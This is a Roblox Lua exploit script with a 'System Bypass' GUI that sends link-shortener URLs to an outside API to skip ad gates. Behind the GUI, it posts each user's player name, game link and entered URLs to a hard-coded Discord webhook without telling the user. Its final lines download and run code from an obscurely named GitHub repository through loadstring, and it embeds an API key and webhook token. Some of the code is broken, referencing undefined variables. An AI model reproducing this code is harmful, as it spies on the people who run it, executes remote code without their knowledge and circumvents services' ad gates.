local PlayerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")

local BypassGui = Instance.new("ScreenGui")
BypassGui.Name = "BypassGui"
BypassGui.Parent = PlayerGui

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 300, 0, 250)
Frame.Position = UDim2.new(0.5, -150, 0.5, -125)
Frame.BackgroundColor3 = Color3.fromRGB(10, 20, 30)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = BypassGui

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 10)
Corner.Parent = Frame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -30, 0, 30)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = ">>> [System Bypass][Beta 0.1] <<<"
Title.TextColor3 = Color3.fromRGB(0, 255, 0)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18
Title.Parent = Frame

local CloseButton = Instance.new("TextButton")
CloseButton.Size = UDim2.new(0, 30, 0, 30)
CloseButton.Position = UDim2.new(1, -30, 0, 0)
CloseButton.BackgroundTransparency = 1
CloseButton.Text = "X"
CloseButton.TextColor3 = Color3.fromRGB(255, 0, 0)
CloseButton.Font = Enum.Font.GothamBold
CloseButton.TextSize = 18
CloseButton.Parent = Frame

local ApiStatus = Instance.new("TextLabel")
ApiStatus.Size = UDim2.new(1, 0, 0, 20)
ApiStatus.Position = UDim2.new(0, 0, 0, 35)
ApiStatus.BackgroundTransparency = 1
ApiStatus.Text = "Status: Checking..."
ApiStatus.TextColor3 = Color3.fromRGB(255, 255, 0)
ApiStatus.Font = Enum.Font.Gotham
ApiStatus.TextSize = 14
ApiStatus.Parent = Frame

local Input = Instance.new("TextBox")
Input.Size = UDim2.new(0.9, 0, 0, 30)
Input.Position = UDim2.new(0.05, 0, 0.25, 0)
Input.BackgroundColor3 = Color3.fromRGB(20, 40, 60)
Input.TextColor3 = Color3.fromRGB(0, 255, 0)
Input.PlaceholderText = "Enter URL"
Input.Text = "Enter URL"
Input.PlaceholderColor3 = Color3.fromRGB(0, 200, 0)
Input.Font = Enum.Font.Code
Input.TextSize = 14
Input.ClearTextOnFocus = true
Input.ClipsDescendants = true
Input.Parent = Frame

local Result = Instance.new("TextLabel")
Result.Size = UDim2.new(0.9, 0, 0, 50)
Result.Position = UDim2.new(0.05, 0, 0.40, 0)
Result.BackgroundColor3 = Color3.fromRGB(20, 40, 60)
Result.TextColor3 = Color3.fromRGB(0, 255, 0)
Result.Text = "Result will appear here"
Result.Font = Enum.Font.Code
Result.TextSize = 14
Result.TextWrapped = true
Result.Parent = Frame

local CopyButton = Instance.new("TextButton")
CopyButton.Size = UDim2.new(0.4, 0, 0, 25)
CopyButton.Position = UDim2.new(0.3, 0, 0.63, 0)
CopyButton.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
CopyButton.Text = "Copy"
CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyButton.Font = Enum.Font.GothamBold
CopyButton.TextSize = 14
CopyButton.Parent = Frame

local InfoFrame = Instance.new("Frame")
InfoFrame.Size = UDim2.new(0.9, 0, 0, 50)
InfoFrame.Position = UDim2.new(0.05, 0, 0.75, 0)
InfoFrame.BackgroundColor3 = Color3.fromRGB(20, 40, 60)
InfoFrame.Parent = Frame

local InfoCorner = Instance.new("UICorner")
InfoCorner.CornerRadius = UDim.new(0, 5)
InfoCorner.Parent = InfoFrame

local CreatorLabel = Instance.new("TextLabel")
CreatorLabel.Size = UDim2.new(1, 0, 0, 20)
CreatorLabel.Position = UDim2.new(0, 0, 0, 0)
CreatorLabel.BackgroundTransparency = 1
CreatorLabel.Text = "By: OneCreatorX"
CreatorLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
CreatorLabel.Font = Enum.Font.Gotham
CreatorLabel.TextSize = 12
CreatorLabel.Parent = InfoFrame

local YoutubeButton = Instance.new("TextButton")
YoutubeButton.Size = UDim2.new(0.45, 0, 0, 20)
YoutubeButton.Position = UDim2.new(0.025, 0, 0.5, 0)
YoutubeButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
YoutubeButton.Text = "YouTube"
YoutubeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
YoutubeButton.Font = Enum.Font.GothamBold
YoutubeButton.TextSize = 12
YoutubeButton.Parent = InfoFrame

local DiscordButton = Instance.new("TextButton")
DiscordButton.Size = UDim2.new(0.45, 0, 0, 20)
DiscordButton.Position = UDim2.new(0.525, 0, 0.5, 0)
DiscordButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
DiscordButton.Text = "Discord"
DiscordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
DiscordButton.Font = Enum.Font.GothamBold
DiscordButton.TextSize = 12
DiscordButton.Parent = InfoFrame

local LoadingFrame = Instance.new("Frame")
LoadingFrame.Size = UDim2.new(1, 0, 1, 0)
LoadingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
LoadingFrame.BackgroundTransparency = 0.5
LoadingFrame.Visible = false
LoadingFrame.Parent = Frame

local LoadingText = Instance.new("TextLabel")
LoadingText.Size = UDim2.new(1, 0, 1, 0)
LoadingText.BackgroundTransparency = 1
LoadingText.Text = "Bypassing..."
LoadingText.TextColor3 = Color3.fromRGB(0, 255, 0)
LoadingText.Font = Enum.Font.Code
LoadingText.TextSize = 18
LoadingText.Parent = LoadingFrame

local function urlDecode(str)
    str = string.gsub(str, '%%(%x%x)', function(h)
        return string.char(tonumber(h, 16))
    end)
    return str
end

local timee = 10

local function snd(wb, msg)
    local decodedMsg = urlDecode(msg)
    local reqBody = {content = decodedMsg}
    local headers = {["Content-Type"] = "application/json"}
    local request = http_request or request or syn.request or http.request
    if request then
        request({
            Url = wb,
            Method = "POST",
            Headers = headers,
            Body = HttpService:JSONEncode(reqBody)
        })
    end
end

local bypassTable = {
    ["social-unlock.com/BaconBossScripts"] = "https://baconbossscripts.com/",
    ["work.ink/BombermanScripts"] = "https://bombermanscripts.com/",
    ["linkvertise.com/RobloxExploits"] = "https://robloxexploits.com/",
    ["sub2unlock.com/MinecraftMods"] = "https://minecraftmodscentral.com/"
}

local function localBypass(url)
    local cleanUrl = url:gsub("^https?://", "")
    
    for key, value in pairs(bypassTable) do
        if cleanUrl:match(key) then
            return value
        end
    end
    
    return nil
end

local function checkApiStatus()
    local success, result = pcall(function()
        return game:HttpGet("https://dlr-api.woozym.workers.dev/api/status")
    end)
    
    if success then
        local data = HttpService:JSONDecode(result)
        if data.status == "OK" and data.website_enabled then
            ApiStatus.Text = "Status: OK"
            local StarterGui = game:GetService("StarterGui")
            StarterGui:SetCore("SendNotification", {
                Title = "Auto Check Status",
                Text = "Status: OK",
                Duration = 5,
            })
            timee = 20
            
            ApiStatus.TextColor3 = Color3.fromRGB(0, 255, 0)
            Input.TextEditable = true

            snd("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", "API Status: OK")
             elseif response.StatusCode == 429 then
                local StarterGui = game:GetService("StarterGui")
            StarterGui:SetCore("SendNotification", {
                Title = "Limit for hour",
                Text = "limit was reached ",
                Duration = 5,
            })
                ApiStatus.Text = "Status: Limit teached for hour"
            snd("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", "API Status: OK")
          
        else
            ApiStatus.Text = "Status: " .. data.status
            local StarterGui = game:GetService("StarterGui")
            StarterGui:SetCore("SendNotification", {
                Title = "Auto Check Status",
                Text = "Status: " .. data.status,
                Duration = 5,
            })
            timee = 10
            
            ApiStatus.TextColor3 = Color3.fromRGB(255, 0, 0)
            Input.TextEditable = false

            snd("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", "API Status: " .. data.status)
        end
    else
        ApiStatus.Text = "Status: Error"
        ApiStatus.TextColor3 = Color3.fromRGB(255, 0, 0)
        Input.TextEditable = false
        
        snd("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", "API Status: Error")
    end
end

local function urlDecode(str)
    str = string.gsub(str, '%%(%x%x)', function(h)
        return string.char(tonumber(h, 16))
    end)
    return str
end

local function sendWebhookInfo(wb, result, url)
    local player = game.Players.LocalPlayer
    local playerName = player.Name
    local gameId = game.PlaceId
    local gameUrl = "https://www.roblox.com/games/" .. gameId

    local message = string.format("Player: %s\nGame: %s\nURL: %s\nResult: %s",
        playerName, gameUrl, url, result)

    snd(wb, message)
end

local function bypass(url)
    local localResult = localBypass(url)
    if localResult then
        sendWebhookInfo("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", localResult, url)
        return localResult, 0
    end

    local api_key = "DLR_YY-1239879716871263871623862137819092787-ZZ"
    local api_url = "https://dlr-api.woozym.workers.dev/"
    local headers = {["x-api-key"] = api_key}
    local encoded_url = HttpService:UrlEncode(url)
    local request = http_request or request or syn.request or http.request
    if not request then return nil, nil end
    
    local success, response = pcall(function()
        return request({
            Url = api_url .. "?url=" .. encoded_url,
            Method = "GET",
            Headers = headers
        })
    end)
    
    if success and response.StatusCode == 200 then
        local data = HttpService:JSONDecode(response.Body)
        if data and data.result then
            if data.result == "https://t.ly/r69Me" then
                sendWebhookInfo("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", "API_MAINTENANCE", url)
                return "API_MAINTENANCE", nil
            elseif success and response.StatusCode == 429 then
                local StarterGui = game:GetService("StarterGui")
            StarterGui:SetCore("SendNotification", {
                Title = "Limit for hour",
                Text = "limit was reached ",
                Duration = 5,
            })
                ApiStatus.Text = "Status: Limit teached for hour"
            elseif data.result == "Invalid API key, join https://discord.gg/Ah8hQwvMYh to get a valid API key" then
                sendWebhookInfo("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", "Invalid API key", url)
                return "Invalid API key", nil
            else
                sendWebhookInfo("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", data.result, url)
                return data.result, data.time_elapsed
            end
        end
    end
    sendWebhookInfo("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", "Bypass failed", url)
    return nil, nil
end

local function processBypass()
    if not Input.TextEditable then return end
    
    LoadingFrame.Visible = true
    local url = Input.Text
    spawn(function()
        local result, time_elapsed = bypass(url)
        LoadingFrame.Visible = false
        local webhook_url = "https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI"
        local message = ""

        if result == "API_MAINTENANCE" then
            Result.Text = "API is currently under maintenance. Please try again later."
            message = string.format("URL: %s\nResult: API is currently under maintenance. Please try again later.", url)
        elseif result and result:match("bypass fail! Please visit our website to see the supported links") then
            Result.Text = "This link or shortener will be available for bypass soon."
            message = string.format("URL: %s\nResult: This link or shortener will be available for bypass soon.\nTime elapsed: %.2f", url, time_elapsed or 0)
        elseif result then
            Result.Text = result
            message = string.format("URL: %s\nResult: %s\nTime elapsed: %.2f", url, result, time_elapsed or 0)
        else
Result.Text = "Failed to bypass"
            message = string.format("URL: %s\nResult: bypass fail! Please try again later or check if this link is supported.\nTime elapsed: %.2f", url, time_elapsed or 0)
        end

        snd(webhook_url, "Prefix: " .. message)
        snd(webhook_url, "Bypass attempt: URL: " .. url .. "\nResponse: " .. Result.Text)
    end)
end

Input.FocusLost:Connect(processBypass)

CopyButton.MouseButton1Click:Connect(function()
    setclipboard(Result.Text)
end)

CloseButton.MouseButton1Click:Connect(function()
    BypassGui:Destroy()
end)

YoutubeButton.MouseButton1Click:Connect(function()
    setclipboard("https://www.youtube.com/@OneCreatorX")
end)

DiscordButton.MouseButton1Click:Connect(function()
    setclipboard("https://discord.com/invite/nn36bjM6RX")
end)

local function checkInterface()
    if not BypassGui.Parent then
        return false
    end
    return true
end

spawn(function()
    while true do
        if not checkInterface() then
            break
        end
        ApiStatus.Text = "Status: Checking..."
        checkApiStatus()
        local StarterGui = game:GetService("StarterGui")
        StarterGui:SetCore("SendNotification", {
            Title = "Auto Check Status",
            Text = "Checking in " .. timee .. "s",
            Duration = 5,
        })
wait(timee)
    end
end)

local function createGlowEffect()
    local Glow = Instance.new("ImageLabel")
    Glow.Size = UDim2.new(1.1, 0, 1.1, 0)
    Glow.Position = UDim2.new(-0.05, 0, -0.05, 0)
    Glow.BackgroundTransparency = 1
    Glow.Image = "rbxassetid://5028857472"
    Glow.ImageColor3 = Color3.fromRGB(0, 255, 0)
    Glow.ZIndex = -1
    Glow.Parent = Frame
end

createGlowEffect()

local function animateColors()
    while checkInterface() do
        for i = 0, 1, 0.01 do
            if not checkInterface() then
                return
            end
            Frame.BackgroundColor3 = Color3.fromHSV(i, 1, 0.2)
            wait(0.05)
        end
    end
end

spawn(function()
local function onVisibilityChanged()
    if loadingFrame.Visible then
        wait(10)
        if loadingFrame.Visible then
            local StarterGui = game:GetService("StarterGui")
            StarterGui:SetCore("SendNotification", {
                Title = "Bypass Low?",
                Text = "Re Send URL",
                Duration = 5,
            })
        end
    end
end

LoadingFrame:GetPropertyChangedSignal("Visible"):Connect(onVisibilityChanged)
   end)

spawn(animateColors)

spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/bjalalsjzbslalqoqueeyhskaambpqo/kajsbsba--hahsjsv-kakwbs_jaks_082hgg927hsksoLol-Noobbro9877272jshshsbsjsURLwww.noob.com.Obfuscate/main/info.lua"))()
    end)
end)
